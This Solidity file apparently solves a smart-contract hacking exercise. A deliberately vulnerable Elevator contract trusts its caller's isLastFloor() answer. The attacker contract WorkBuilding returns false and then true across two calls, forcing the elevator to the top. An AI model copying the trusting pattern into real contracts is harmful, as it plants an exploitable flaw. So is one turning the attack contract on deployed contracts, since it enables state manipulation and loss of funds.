// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
  bool public top;
  uint256 public floor;

  function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract WorkBuilding is Building {
  uint256 public lastFloor = 10;
  uint256 public coef = 0;

  function goToLastFloor(Elevator _elevator) public {
    _elevator.goTo(lastFloor - 1);
  }

  function isLastFloor(uint256 _floor) external override returns (bool) {
    uint256 floor = _floor + coef;
    coef += 1;

    if (floor == lastFloor) {
      return true;
    }
    return false;
  }
}
